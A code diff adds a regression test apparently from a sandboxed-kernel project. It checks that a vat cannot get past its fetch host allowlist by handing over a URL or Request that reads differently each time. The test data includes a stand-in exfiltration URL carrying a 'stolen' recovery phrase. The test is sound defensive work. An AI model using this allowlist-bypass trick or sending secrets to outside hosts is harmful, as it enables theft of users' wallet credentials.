@@ -65,4 +65,62 @@ describe('endowments', () => {
       `error: Error: Invalid host: ${badHost}`,
     ]);
   });
+
+  // Regression test for the CWE-367 escape reported in
+  // MetaMask/MetaMask-planning#7557: a vat handed `fetch` an input that named
+  // an allowlisted host when the caveat read it and a forbidden host when
+  // `fetch` read it again.
+  it('confines a vat that resolves a fetch input differently on each read', async () => {
+    const vatId: VatId = 'v1';
+    const v1Root: KRef = 'ko4';
+    const { logger, entries } = makeTestLogger();
+    const database = await makeSQLKernelDatabase({});
+    const kernel = await makeKernel(
+      database,
+      true,
+      logger,
+      getWorkerFile('mock-fetch'),
+    );
+    const goodHost = 'good-url.test';
+    const badHost = 'bad-url.test';
+    await kernel.launchSubcluster({
+      bootstrap: 'main',
+      vats: {
+        main: {
+          bundleSpec: getBundleSpec('endowment-fetch'),
+          parameters: {},
+          globals: ['fetch', 'Request', 'Headers', 'Response'],
+          network: { allowedHosts: [goodHost] },
+        },
+      },
+    });
+    await waitUntilQuiescent();
+
+    const decoyUrl = `https://${goodHost}/decoy`;
+    const targetUrl = `https://${badHost}/exfil?srp=stolen`;
+
+    await kernel.queueMessage(v1Root, 'fetchWithTwoFacedUrl', [
+      decoyUrl,
+      targetUrl,
+    ]);
+    await waitUntilQuiescent();
+
+    await kernel.queueMessage(v1Root, 'fetchWithSpoofedRequest', [
+      decoyUrl,
+      targetUrl,
+    ]);
+    await waitUntilQuiescent();
+
+    expect(extractTestLogs(entries, vatId)).toStrictEqual([
+      'buildRootObject',
+      'bootstrap',
+      // Both reads are the kernel's, and their disagreement is refused rather
+      // than resolved in the vat's favour.
+      'error: Error: fetch input resolved to a different URL when read again.',
+      'reads: 2',
+      // A `Request` is copied before it is forwarded, so the lying getter buys
+      // nothing and the real host is rejected.
+      `error: Error: Invalid host: ${badHost}`,
+    ]);
+  });
 });
